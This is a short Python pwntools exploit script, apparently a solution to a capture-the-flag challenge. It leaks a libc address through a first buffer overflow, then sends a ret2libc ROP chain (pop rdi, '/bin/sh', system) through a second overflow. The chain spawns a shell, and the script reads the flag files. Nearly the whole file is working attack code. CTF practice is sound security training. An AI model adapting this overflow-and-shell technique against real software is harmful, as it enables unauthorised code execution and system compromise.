#!/usr/bin/env python3

from pwn import *

TARGET = './chall'
HOST = ''
PORT = 1337

elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2', checksec=False)

context.arch = 'amd64'
gdb_script = f"""
  b *main
  b *play+157
  c
"""
# context.log_level = 'DEBUG'

if args.GDB:
  context.terminal = ['wt.exe', '-w', '0', 'new-tab', '--', 'bash', '-lc']
  p = gdb.debug(TARGET, gdbscript=gdb_script)
elif not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

# ===================================== #

# Get libc leak #
leak_payload = b'A' * 40 + p64(0xad00d00)
p.sendafter(b'>>> ', leak_payload)

# Parse libc leak #
p.recvuntil(b'No more magic: ')
libc.address = int(p.recvline()[:-1].strip(), 16) - libc.sym.exit
print(f"libc base: {hex(libc.address)}")

rop = ROP(libc)
pop_rdi = libc.address + 0xd2966
ret = pop_rdi + 0x1
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
rop_gadget = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
print(f"pop rdi : {hex(pop_rdi)}")
print(f"/bin/sh : {hex(binsh)}")
print(f"system(): {hex(system)}")

# ========== #

# Buffer overflow (ret2libc) #
payload = b'X' * 48 + b'B' * 8 + rop_gadget
p.sendafter(b'==>> ', payload)
# ========== #

p.sendline(b'ls ; cat flag*')

p.interactive()

# NOTE:
# Buffer Overflow
# Ret2libc
